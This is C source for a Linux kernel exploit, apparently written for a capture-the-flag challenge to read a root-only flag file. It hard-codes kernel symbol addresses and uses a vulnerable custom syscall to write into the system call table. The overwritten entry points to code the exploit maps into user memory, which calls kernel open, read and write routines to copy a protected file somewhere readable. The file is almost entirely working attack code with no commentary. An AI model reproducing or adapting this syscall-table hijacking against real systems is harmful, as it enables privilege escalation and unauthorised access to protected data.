#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <stdint.h>

// modify the below based on what you see in /proc/kallsyms
#define SYS_CALL_TABLE_BASE 0xc1cbc240      // sys_call_table
#define PRINTK_ADDR         0xc10a45bb      // printk
#define SYS_OPEN            0xc1191f50      // do_sys_open
#define SYS_READ            0xc1195070      // ksys_read
#define SYS_WRITE           0xc1195130      // ksys_write
#define NR_SYS_UPPER_CASE	223             // the unused syscall number we hijack

#define KB 1024
#define MB (KB) * (KB)
#define BUFF_SIZE (KB)*1

typedef uint32_t u32;


/*
   Compile with -no-pie

   gcc -no-pie -o exploit exploit.c
   */




/* 
   asmlinkage long sys_upper(char *in, char* out);

    long do_sys_open(int dfd, const char __user *filename, int flags, umode_t mode)

    ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)

    ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
*/

const char* flagfile = "/root/flag";

//typedef int (*printer_ty)(const char *fmt, ...);
//typedef long (*sys_open_ty)(int,const char*, int, unsigned);
//typedef long (*sys_read_ty)(int,char*, unsigned);
//typedef long (*sys_write_ty)(int,const char*, unsigned);

typedef long (*sys_call)(void);

int sys_open(const char  *filename, int flags, int mode)
{
    long fd;
    asm
        (
            ".intel_syntax;"
            "mov %%ecx, %0;"
            "mov %%edx, %1;"
            "mov %%esi, %2;"
            ".att_syntax;"
            :
            : "r"(filename),"r"(flags),"r"(mode)
            : "ecx", "edx", "esi"
        );
    fd = ((sys_call)SYS_OPEN)();
    return fd;
}


int sys_read(int fd, char* buf, unsigned len)
{
    int read = 0;
    asm
        (
            ".intel_syntax;"
            "mov %%ebx, %0;"
            "mov %%ecx, %1;"
            "mov %%edx, %2;"
            ".att_syntax;"
            :
            : "r"(fd),"r"(buf),"r"(len)
            : "ebx", "ecx", "edx" 
        );
    read = ((sys_call)SYS_READ)();
    return read;
}

int sys_write(int fd, const char* buf, unsigned len)
{
    int written = 0;
    asm
        (
            ".intel_syntax;"
            "mov %%ebx, %0;"
            "mov %%ecx, %1;"
            "mov %%edx, %2;"
            ".att_syntax;"
            :
            : "r"(fd),"r"(buf),"r"(len)
            : "ebx", "ecx", "edx" 
        );
    written = ((sys_call)SYS_WRITE)();
    return written;
}

int read_file(char* path, char* path2)
{
//    while(1) {}

    //printer_ty prin = (printer_ty)PRINTK_ADDR;
    char buf[128];
    int written = 0;
    int i;
    //prin("Inside read_file, flagfile: %s\n", flagfile);
    //prin("Inside read_file, newfile: %s\n", path2);
    for(i=0;i<sizeof(buf);i++) {
        buf[i] = 0;
    }
    int fd = sys_open(path, O_RDONLY, 0);
    // for(;;) {}
    //prin("Inside read_file - open: %d\n", fd);
    unsigned r = sys_read(fd, buf, sizeof(buf)-1); 
    //prin("Inside read_file - read bytes: %u\n", r);
    fd = sys_open(path2, O_CREAT, S_IRUSR|S_IWUSR|
                                    S_IRGRP|S_IWGRP|
                                    S_IROTH|S_IWOTH);
    //prin("Inside read_file - created: %s, fd: %d\n",path2, r);
    written = sys_write(fd, buf, sizeof(buf));
    //prin("Inside read_file - written to fd: %d bytes: %u\n", fd, written);
    return written;

}


long lower_to_upper(char* from, char* to)
{
    return syscall(NR_SYS_UPPER_CASE, from, to);
} 

void cop_addr(char* to, char* from)
{
    int i;
    for(i=0;i<4;i++) {
        to[i] = from[i];
    }
}

#define AL_SZ (4096 * 8)


int main(int argc, char** argv)
{
    void* remapped_addr = atoi(argv[1]);
    unsigned int syscall_entry_addr = SYS_CALL_TABLE_BASE + (NR_SYS_UPPER_CASE * sizeof(char*));

    printf("Want to mmap code to: %p\n", remapped_addr);
    remapped_addr = mmap(remapped_addr, AL_SZ, PROT_EXEC|PROT_READ|PROT_WRITE, 
                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if(remapped_addr == MAP_FAILED) {
        printf("mmap failed.\n");
        exit(1);
    }

    printf("code got mapped to: %p\n", remapped_addr);
    memset(remapped_addr, '0x90', AL_SZ);

    void* map_start = (void*)0x08048154;
    void* map_end =   (void*)0x0804b046;
    int len = map_end - map_start;
    printf("Code length to be copied: %d\n", len);


    memcpy(remapped_addr, map_start, len);
    u32 our_rmaped_func = (u32)remapped_addr + ((u32)read_file - (u32)map_start);
    printf("readfile addr: %p offset: %u -> Address of remapped func: %p\n",
            read_file, ((u32)read_file - (u32)map_start), (void*)our_rmaped_func );

    char fun[5];
    memset(fun, 0 , sizeof(fun));
    cop_addr(fun, (char*)&our_rmaped_func);
    lower_to_upper(fun, (char*)syscall_entry_addr);
//    validate((char*)syscall_entry_addr, fun);
    getchar();
    lower_to_upper((char*)flagfile, argv[2]);

    return 0;
}

